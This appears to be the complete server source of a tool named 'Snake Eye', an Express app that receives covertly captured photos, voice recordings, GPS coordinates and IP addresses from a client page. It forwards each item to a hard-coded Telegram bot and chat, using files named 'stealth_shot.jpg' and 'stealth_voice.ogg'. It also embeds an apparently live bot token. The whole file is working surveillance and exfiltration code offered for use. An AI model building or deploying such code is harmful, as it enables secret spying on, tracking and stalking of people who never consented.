import express from "express";
import path from "path";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";

dotenv.config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8841201272:AAFBsCVi8Rc_sMwy7Oqrlq1IRgkiV4iPXpo";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8852233875";

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Set express body parser limit to 50mb
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));

  // In-memory data store for stats and status
  let active = false; 
  let photosCount = 0;
  let audioCount = 0;
  let lastPhotoAt: string | null = null;
  let lastAudioAt: string | null = null;

  // API Endpoints

  // GET /api/capture/status
  app.get("/api/capture/status", (req, res) => {
    res.json({
      active,
      photosCount,
      audioCount,
      lastPhotoAt,
      lastAudioAt,
    });
  });

  // POST /api/capture/location - streams standalone geolocation data to Telegram
  app.post("/api/capture/location", async (req, res) => {
    try {
      const { latitude, longitude, ipAddress, timestamp, locationSource } = req.body;
      if (!latitude || !longitude) {
        return res.status(400).json({ success: false, message: "Missing latitude or longitude values" });
      }

      // 1. Send native location pin to Telegram
      const locResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          latitude: Number(latitude),
          longitude: Number(longitude),
        }),
      });

      // 2. Send text message with context, IP and Source Origin
      let text = `📍 *Device Geolocation Established*\n`;
      text += `• Time: ${timestamp || new Date().toISOString()}\n`;
      if (ipAddress) {
        text += `• IP Address: \`${ipAddress}\`\n`;
      }
      if (locationSource) {
        text += `• Origin: *${locationSource}*\n`;
      }
      text += `• Coords: \`${latitude}, ${longitude}\`\n`;
      text += `• Google Map: https://www.google.com/maps?q=${latitude},${longitude}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: "Markdown",
        }),
      });

      return res.json({ success: true, message: "Location trace sent safely to Telegram" });
    } catch (error: any) {
      console.error("Error sending location trace to Telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // POST /api/capture/active - updates active status
  app.post("/api/capture/active", (req, res) => {
    const { active: newActive } = req.body;
    if (typeof newActive === "boolean") {
      active = newActive;
    }
    res.json({ success: true, active });
  });

  // POST /api/capture/photo
  app.post("/api/capture/photo", async (req, res) => {
    try {
      const { imageData, timestamp, latitude, longitude, ipAddress } = req.body;
      if (!imageData) {
        return res.status(400).json({ success: false, message: "Missing imageData value" });
      }

      // Strip "data:image/jpeg;base64," prefix if it exists
      let pureBase64 = imageData;
      if (imageData.includes(",")) {
        pureBase64 = imageData.split(",")[1];
      }

      const buffer = Buffer.from(pureBase64, 'base64');
      const blob = new Blob([buffer], { type: 'image/jpeg' });

      // Build rich caption
      let caption = `🐍 Photo captured at ${timestamp || new Date().toLocaleTimeString()}`;
      if (ipAddress) {
        caption += `\nIP: ${ipAddress}`;
      }
      if (latitude && longitude) {
        caption += `\nCoords: ${latitude}, ${longitude}\nMap: https://www.google.com/maps?q=${latitude},${longitude}`;
      }

      // Form data with chat_id, photo, and caption
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, "stealth_shot.jpg");
      formData.append("caption", caption);

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      });

      const result = await response.json() as any;

      if (response.ok && result?.ok) {
        photosCount++;
        lastPhotoAt = timestamp || new Date().toLocaleTimeString();
        return res.json({ success: true, message: "Glimpse delivered successfully" });
      } else {
        console.error("Telegram sendPhoto fail details:", result);
        return res.status(502).json({
          success: false,
          message: result?.description || "Failed to stream snapshot to Telegram."
        });
      }
    } catch (error: any) {
      console.error("Error sending photo to telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // POST /api/capture/audio
  app.post("/api/capture/audio", async (req, res) => {
    try {
      const { audioData, mimeType, durationSeconds, timestamp, latitude, longitude, ipAddress } = req.body;
      if (!audioData) {
        return res.status(400).json({ success: false, message: "Missing audioData value" });
      }

      // Strip data URI prefix
      let pureBase64 = audioData;
      if (audioData.includes(",")) {
        pureBase64 = audioData.split(",")[1];
      }

      const buffer = Buffer.from(pureBase64, 'base64');
      const blob = new Blob([buffer], { type: mimeType || 'audio/ogg' });

      // Build rich caption
      let caption = `🎙️ Voice captured at ${timestamp || new Date().toLocaleTimeString()}`;
      if (ipAddress) {
        caption += `\nIP: ${ipAddress}`;
      }
      if (latitude && longitude) {
        caption += `\nLoc: ${latitude}, ${longitude}`;
      }

      // Form data with chat_id, voice, and duration
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("voice", blob, "stealth_voice.ogg");
      formData.append("caption", caption);
      if (durationSeconds) {
        formData.append("duration", String(Math.round(durationSeconds)));
      }

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
        method: "POST",
        body: formData,
      });

      const result = await response.json() as any;

      if (response.ok && result?.ok) {
        audioCount++;
        lastAudioAt = timestamp || new Date().toLocaleTimeString();
        return res.json({ success: true, message: "Whisper delivered successfully" });
      } else {
        console.error("Telegram sendVoice fail details:", result);
        return res.status(502).json({
          success: false,
          message: result?.description || "Failed to stream audio file to Telegram."
        });
      }
    } catch (error: any) {
      console.error("Error sending voice message to telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // Serve Vite assets in development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files in production
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // Bind to port 3000 and 0.0.0.0
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Snake Eye background server running on http://localhost:${PORT}`);
  });
}

startServer();
